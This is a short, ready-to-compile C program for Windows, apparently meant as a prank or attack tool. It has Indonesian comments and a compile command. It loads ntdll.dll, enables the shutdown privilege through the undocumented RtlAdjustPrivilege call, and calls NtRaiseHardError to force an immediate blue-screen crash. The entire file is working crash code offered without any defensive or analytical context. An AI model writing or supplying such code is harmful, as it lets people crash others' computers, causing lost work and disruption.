#include <windows.h>

// to compile: x86_64-w64-mingw32-gcc -o bsod.exe bsod.c

int main() {
    // Dapatkan pointer ke fungsi RtlAdjustPrivilege & NtRaiseHardError
    typedef NTSTATUS(WINAPI *RtlAdjustPrivilegeFunc)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
    typedef NTSTATUS(WINAPI *NtRaiseHardErrorFunc)(NTSTATUS, ULONG, ULONG, ULONG*, ULONG, PULONG);

    HMODULE ntdll = LoadLibraryA("ntdll.dll");

    if (!ntdll) return 1;

    RtlAdjustPrivilegeFunc RtlAdjustPrivilege = (RtlAdjustPrivilegeFunc)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    NtRaiseHardErrorFunc NtRaiseHardError = (NtRaiseHardErrorFunc)GetProcAddress(ntdll, "NtRaiseHardError");

    BOOLEAN tmp;
    ULONG resp;

    RtlAdjustPrivilege(19, TRUE, FALSE, &tmp); // SeEnableShutdownPrivilege
    NtRaiseHardError(0xC0000022, 0, 0, NULL, 6, &resp); // STATUS_ACCESS_DENIED => BSOD

    return 0;
}
